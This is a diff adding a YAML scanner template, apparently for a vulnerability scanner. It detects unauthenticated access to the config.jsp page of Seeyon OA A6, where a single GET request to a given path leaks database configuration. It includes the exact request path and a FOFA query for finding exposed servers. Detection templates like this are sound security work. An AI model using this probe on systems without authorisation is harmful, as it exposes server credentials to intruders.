@@ -1,0 +1,25 @@
+id: seeyon-config-disclosure
+
+info:
+  name: 致远OA A6 config.jsp 敏感信息泄漏漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |
+    致远OA A6 config.jsp页面可未授权访问，导致敏感信息泄漏漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
+    fofa: body="yyoa" && app="致远互联-OA"
+  tags: seeyon,a6,config,disclosure
+  created: 2023/05/26
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/ext/trafaxserver/SystemManage/config.jsp
+    expression: |
+      response.status == 200 && 
+      response_text.contains('DatabaseName=') &&
+      response_text.contains("<li>点击确定即可保存您修改的配置信息</li>")
+expression: r0()
